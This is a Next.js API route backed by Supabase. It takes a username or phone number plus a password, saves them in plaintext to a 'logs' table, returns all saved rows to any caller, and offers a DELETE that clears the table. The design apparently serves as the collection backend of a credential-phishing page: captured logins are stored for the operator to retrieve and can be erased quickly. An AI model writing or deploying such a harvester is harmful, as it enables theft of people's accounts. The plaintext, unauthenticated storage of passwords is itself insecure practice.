import type { NextApiRequest, NextApiResponse } from 'next';
import { supabase } from '../../lib/supabase';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  try {
    if (req.method === 'GET') {
      // Fetch logs from Supabase
      const { data, error } = await supabase
        .from('logs')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      return res.status(200).json(data);
    } 
    
    else if (req.method === 'POST') {
      const { username, phone, password } = req.body;
      
      // Basic validation
      if (!password || (!username && !phone)) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      // Insert into Supabase
      const { data, error } = await supabase
        .from('logs')
        .insert([
          { 
            identifier: username || phone, 
            password: password, 
            type: username ? 'email/user' : 'phone' 
          }
        ]);

      if (error) throw error;
      return res.status(201).json({ success: true });
    }
    
    else if (req.method === 'DELETE') {
      // Clear all logs from Supabase
      const { error } = await supabase
        .from('logs')
        .delete()
        .neq('id', 0); // Delete everything where ID is not 0 (all rows)

      if (error) throw error;
      return res.status(200).json({ success: true });
    }

    res.setHeader('Allow', ['GET', 'POST', 'DELETE']);
    return res.status(405).end(`Method ${req.method} Not Allowed`);
  } catch (error: any) {
    console.error("Supabase API Error:", error.message);
    return res.status(500).json({ error: error.message || "Internal Server Error" });
  }
}
